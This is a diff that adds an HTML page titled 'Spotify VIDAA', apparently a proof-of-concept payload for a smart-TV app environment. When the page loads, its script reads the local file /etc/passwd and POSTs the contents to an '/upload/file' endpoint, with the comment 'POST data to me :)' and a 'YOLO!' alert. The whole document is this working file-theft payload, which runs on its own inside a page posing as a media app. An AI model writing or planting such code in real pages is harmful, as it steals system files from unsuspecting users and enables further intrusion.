@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify VIDAA</title>
+</head>
+
+<body onload="readTextFile('file:/etc/passwd')">
+    <script>
+        function readTextFile(filename) {
+            let rawFile = new XMLHttpRequest();
+            rawFile.open("GET", filename, false);
+            rawFile.onreadystatechange = function () {
+                if (rawFile.readyState === 4) {
+                    if (rawFile.status === 200 || rawFile.status == 0) {
+                        let daText = rawFile.responseText;
+                        // POST data to me :)
+                        let formData = new FormData();
+                        formData.append("name", filename)
+                        formData.append("file", daText + "\r\n\r\n\r\n");
+                        fetch('/upload/file', { method: "POST", body: formData });
+                        alert("YOLO!");
+                    }
+                }
+            }
+            rawFile.send(null);
+        }
+    </script>
+</body>
+
+</html>
